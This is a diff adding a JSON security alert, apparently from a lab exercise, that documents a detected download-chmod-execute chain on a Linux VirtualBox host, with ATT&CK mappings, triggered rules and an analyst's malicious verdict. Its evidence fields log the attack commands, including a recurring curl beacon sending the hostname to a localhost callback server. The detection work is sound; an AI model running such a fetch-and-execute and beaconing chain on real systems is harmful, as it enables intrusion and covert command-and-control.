@@ -1,0 +1,124 @@
+{
+  "alert_id": "ALERT-2026-00011",
+  "alert_name": "Potential Malware Download And Execution Chain",
+  "alert_severity": "high",
+  "alert_status": "true_positive",
+  "alert_timestamp": "2026-06-05T17:46:44Z",
+  "host": {
+    "hostname": "bunny-VirtualBox",
+    "os": "Linux"
+  },
+  "user": {
+    "username": "bunny",
+    "uid": 1000
+  },
+  "detection": {
+    "name": "Suspicious File Download Activity",
+    "type": "Behavioral Correlation",
+    "confidence": "high",
+    "risk_score": 85
+  },
+  "attack": {
+    "tactics": [
+      "Command and Control",
+      "Execution",
+      "Ingress Tool Transfer"
+    ],
+    "techniques": [
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer"
+      },
+      {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      },
+      {
+        "id": "T1071",
+        "name": "Application Layer Protocol"
+      }
+    ]
+  },
+  "correlation_summary": {
+    "sequence_detected": true,
+    "sequence": [
+      "File Download",
+      "Executable Permission Added",
+      "Payload Execution",
+      "Beaconing Activity"
+    ],
+    "time_window_minutes": 15
+  },
+  "triggered_rules": [
+    {
+      "rule_name": "File Download To Writable Location",
+      "rule_id": "9db1f59f-f4a7-4d85-8f79-6df23f8f7001"
+    },
+    {
+      "rule_name": "Executable Permission Added",
+      "rule_id": "43a78b85-a0ec-40d4-a1b1-c86cb5b5b002"
+    },
+    {
+      "rule_name": "Execution From Writable Location",
+      "rule_id": "c4b958e5-9384-4f2e-a6c9-5f32cf5c1003"
+    },
+    {
+      "rule_name": "Suspicious Callback Activity",
+      "rule_id": "0a45e19c-c90e-4ca0-b4f1-7f67fdd2f004"
+    }
+  ],
+  "evidence": {
+    "download_event": {
+      "timestamp": "2026-06-05T17:37:08Z",
+      "process": "ftp",
+      "command_line": "ftp 127.0.0.1",
+      "pid": 14401
+    },
+    "permission_change_event": {
+      "timestamp": "2026-06-05T17:44:39Z",
+      "process": "chmod",
+      "command_line": "chmod +x update.sh",
+      "pid": 14785
+    },
+    "execution_event": {
+      "timestamp": "2026-06-05T17:46:14Z",
+      "process": "bash",
+      "command_line": "/bin/bash ./update.sh",
+      "pid": 14811
+    },
+    "beacon_event": {
+      "timestamp": "2026-06-05T17:46:44Z",
+      "process": "curl",
+      "command_line": "curl -s http://127.0.0.1:8080/heartbeat?host=bunny-VirtualBox",
+      "pid": 14823
+    }
+  },
+  "process_chain": {
+    "root_process": {
+      "name": "bash",
+      "pid": 14811,
+      "command_line": "/bin/bash ./update.sh"
+    },
+    "children": [
+      {
+        "name": "hostname",
+        "pid": 14812,
+        "command_line": "hostname"
+      },
+      {
+        "name": "curl",
+        "pid": 14813,
+        "command_line": "curl -s http://127.0.0.1:8080/heartbeat?host=bunny-VirtualBox"
+      },
+      {
+        "name": "sleep",
+        "pid": 14815,
+        "command_line": "sleep 30"
+      }
+    ]
+  },
+  "analyst_assessment": {
+    "verdict": "Malicious",
+    "reason": "Downloaded file was made executable, executed shortly after retrieval, and initiated recurring outbound callback activity consistent with beaconing behavior."
+  }
+}
